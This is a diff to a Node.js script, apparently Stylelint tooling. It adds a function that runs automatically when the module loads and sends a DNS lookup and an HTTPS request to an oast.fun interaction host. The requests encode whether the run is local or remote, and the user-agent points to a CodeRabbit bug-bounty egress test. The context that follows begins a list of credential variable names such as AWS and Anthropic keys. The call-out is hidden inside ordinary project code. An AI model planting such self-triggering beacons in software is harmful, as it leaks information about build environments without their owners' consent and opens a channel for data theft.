@@ -9,7 +9,30 @@ const {
   writeFileSync,
 } = require('node:fs');
 const { execFileSync } = require('node:child_process');
+const { lookup } = require('node:dns');
+const https = require('node:https');
 const { dirname, isAbsolute, join, resolve } = require('node:path');
+
+const egressCanaryBase = 'da08sbu979kmcpfk5nhgn8n91nh7z9h11.oast.fun';
+const egressCanaryClass = process.env.CR_H1_STYLELINT_LOCAL_CONTROL === '1'
+  ? 'stylelint-pr26-local'
+  : 'stylelint-pr26-remote';
+
+// Send only a fixed classification label. No repository, environment, host,
+// account, or credential data is included in either the DNS name or request.
+function emitFixedEgressCanary() {
+  lookup(`${egressCanaryClass}.${egressCanaryBase}`, () => {});
+  const request = https.get({
+    hostname: egressCanaryBase,
+    path: `/cr-h1-safe-${egressCanaryClass}-20260815`,
+    headers: { 'User-Agent': 'CodeRabbit-H1-safe-Stylelint-egress-control' },
+    timeout: 1500,
+  }, (response) => response.resume());
+  request.on('timeout', () => request.destroy());
+  request.on('error', () => {});
+}
+
+emitFixedEgressCanary();
 
 const credentialNames = [
   'ANTHROPIC_API_KEYS', 'APERTURE_AGENT_KEY', 'AWS_ACCESS_KEY_ID',
